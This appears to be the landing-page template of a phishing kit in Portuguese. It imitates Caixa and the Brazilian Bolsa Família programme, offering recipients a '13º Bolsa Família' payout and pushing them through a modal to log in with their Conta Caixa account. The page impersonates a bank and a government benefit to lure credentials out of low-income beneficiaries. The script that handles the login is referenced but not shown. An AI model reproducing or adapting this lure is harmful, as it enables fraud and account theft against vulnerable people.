<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bolsa Familia Atualizar Cadastro</title>
    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
    
    <link rel="stylesheet" href="<?=PATH?>/css/index.css">

    <link rel="stylesheet" href="<?=PATH?>/css/modal.css">
</head>
<body>
<!-- MODAL --> 
<div id="myModal" class="modal">

  <!-- Modal content -->
  <div class="modal-content">
    <img src="<?=PATH?>images/logo_caixa.png" height="30px;" alt="">
    <br><br>
    <h1>Aceite os termos de uso</h1>
    <br>
    <p>
        1. Após aceitar os Termos será necessário realizar login com sua Conta Caixa para que seja validado seus dados e prossiga com a solicitação do 13º Bolsa Família.
    </p>
    <br><br><br>
    <img src="<?=PATH?>images/logo_bolsa_familia.webp" height="80px" alt="">
    <br><br><br>
    <hr>    
    <button class="close-d" id='btn-redirect'><span id="load"><img src="<?=PATH?>images/loading.gif" height="20px;" alt="">Carregando...</span><span id="accept">Aceitar</span></button>
    <button class="close">Fechar</button>
    <br><br><br>
  </div>

</div>
<!-- FIM MODAL -->

    <header>
        <img src="<?=PATH?>images/logo_bolsa_familia.webp" alt="">

        <a id="myBtn" class="bg-blue-700" href="#">Resgatar 13º Bolsa Família<svg xmlns="http://www.w3.org/2000/svg" width="23" height="23" fill="currentColor" viewBox="0 0 333 363" class="ml-2"><path fill-rule="evenodd" d="M.6 30.6h331.6v331.6H.6V30.6Zm26 26v279.6h279.6V56.6H26.6Z" clip-rule="evenodd"></path><path fill-rule="evenodd" d="M73.5 89.9V.1h26v89.8h-26ZM127.7 89.9V.1h26v89.8h-26ZM181 89.9V.1h26v89.8h-26ZM235.3 89.9V.1h26v89.8h-26ZM256.928 159.628l-116.24 116.24-64.828-64.952 25.48-25.432 39.372 39.448 90.76-90.76 25.456 25.456Z" clip-rule="evenodd"></path></svg> </a>
    </header>

    <section class="section-1">
        <div>
            <p>
                Você já fez o resgate do 13º Bolsa Família?
            </p>
            <p>
                Se você é um beneficiário do Bolsa Família <br>
                 e ainda não resgatou seu décimo terceiro <br>
                 a hora é agora !
            </p>
        </div>
        <div class="bg-senhora">
            <img src="<?=PATH?>images/senhora.webp" height="500px" alt="">
        </div>
    </section>
    <br><br><br><br><br>
    <footer>
        <div>
            <img src="<?=PATH?>images/brasil_rodape.webp" height="50px" alt="">
        </div>
        <div class="rede-social">
            <img src="<?=PATH?>images/fb.webp" alt="">
            <img src="<?=PATH?>images/insta.webp" alt="">
            <img src="<?=PATH?>images/twitter.webp" alt="">
        </div>
    </footer>

    <script src="<?=PATH?>js/modal.js"></script>
</body>
</html>